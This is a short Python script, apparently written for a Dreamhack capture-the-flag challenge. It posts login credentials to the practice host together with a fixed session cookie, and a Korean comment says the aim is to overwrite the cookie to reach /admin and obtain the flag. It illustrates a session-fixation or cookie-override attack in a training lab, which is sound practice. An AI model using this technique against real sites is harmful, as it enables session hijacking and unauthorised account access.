import requests
import os
import random

username = 'user'
password = 'user1234'

url = "http://host3.dreamhack.games:19740/login"

res = requests.post(url, data={"username":username, "password":password}, cookies={"sessionid":"813ccc5637c02d69df348a99d73f0663b449e05bc496122fe1c51ba707205d0b"})
print(res.text)

# /admin에서 세션을 확인해서 쿠키를 덮어서 플래그를 획득하는 문제
